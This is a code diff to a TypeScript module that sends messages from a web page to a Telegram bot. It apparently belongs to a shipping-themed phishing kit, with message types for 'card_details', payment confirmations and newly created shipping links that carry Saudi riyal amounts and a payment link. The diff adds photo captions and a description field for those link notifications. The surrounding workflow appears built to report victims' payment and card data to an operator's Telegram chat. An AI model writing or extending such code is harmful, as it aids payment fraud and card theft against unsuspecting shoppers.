@@ -21,6 +21,8 @@ export interface TelegramMessage {
   type: 'shipping_link_created' | 'payment_recipient' | 'payment_confirmation' | 'card_details' | 'test';
   data: Record<string, any>;
   timestamp: string;
+  imageUrl?: string; // Optional image URL for shipping_link_created
+  description?: string; // Optional description for shipping_link_created
 }
 
 export interface TelegramResponse {
@@ -43,6 +45,62 @@ export const sendToTelegram = async (message: TelegramMessage): Promise<Telegram
 
     const text = formatTelegramMessage(message);
     
+    // If imageUrl is provided for shipping_link_created, send photo with caption
+    if (message.type === 'shipping_link_created' && message.imageUrl) {
+      const imageUrl = message.imageUrl.startsWith('http') 
+        ? message.imageUrl 
+        : `${window.location.origin}${message.imageUrl}`;
+      
+      console.log('Sending photo to Telegram:', { chatId: CHAT_ID, imageUrl, caption: text });
+      
+      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          photo: imageUrl,
+          caption: text,
+          parse_mode: 'HTML'
+        })
+      });
+
+      const responseData = await response.json();
+      
+      if (!response.ok) {
+        console.error('Telegram API error:', responseData);
+        
+        // Provide specific error messages for common issues
+        let errorMessage = responseData.description || 'Unknown error';
+        
+        if (responseData.error_code === 403) {
+          if (responseData.description?.includes("bots can't send messages to bots")) {
+            errorMessage = 'خطأ: لا يمكن للبوت إرسال رسائل للبوت نفسه. يرجى تحديث CHAT_ID بمعرف المستخدم الصحيح. استخدم get-user-chat-id.html للحصول على معرف المحادثة الصحيح.';
+          } else if (responseData.description?.includes("Forbidden")) {
+            errorMessage = 'خطأ: محظور. تأكد من بدء محادثة مع البوت أولاً.';
+          }
+        } else if (responseData.error_code === 400) {
+          if (responseData.description?.includes("chat not found")) {
+            errorMessage = 'خطأ: لم يتم العثور على المحادثة. تأكد من صحة معرف المحادثة.';
+          }
+        }
+        
+        return {
+          success: false,
+          error: errorMessage
+        };
+      }
+
+      console.log('✅ Telegram photo sent successfully:', responseData);
+      
+      return {
+        success: true,
+        messageId: responseData.result?.message_id?.toString()
+      };
+    }
+    
+    // Default: send text message
     console.log('Sending to Telegram:', { chatId: CHAT_ID, message: text });
     
     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -112,7 +170,7 @@ export const testTelegramConnection = async (): Promise<TelegramResponse> => {
 };
 
 const formatTelegramMessage = (message: TelegramMessage): string => {
-  const { type, data, timestamp } = message;
+  const { type, data, timestamp, description } = message;
   
   let header = '';
   let content = '';
@@ -138,13 +196,15 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
       
     case 'shipping_link_created':
       header = '🚚 <b>تم إنشاء رابط شحن جديد</b>';
+      const serviceDescription = description || '';
+      const descriptionText = serviceDescription ? `\n📝 <b>الوصف:</b> ${serviceDescription}` : '';
       content = `
 📦 <b>تفاصيل الشحنة:</b>
 • رقم الشحنة: <code>${data.tracking_number || 'غير محدد'}</code>
 • خدمة الشحن: ${data.service_name || 'غير محدد'}
 • وصف الطرد: ${data.package_description || 'غير محدد'}
 • مبلغ الدفع: ${data.cod_amount || 0} ر.س
-• الدولة: ${data.country || 'غير محدد'}
+• الدولة: ${data.country || 'غير محدد'}${descriptionText}
 • رابط الدفع: <a href="${data.payment_url}">اضغط هنا</a>
       `;
       break;
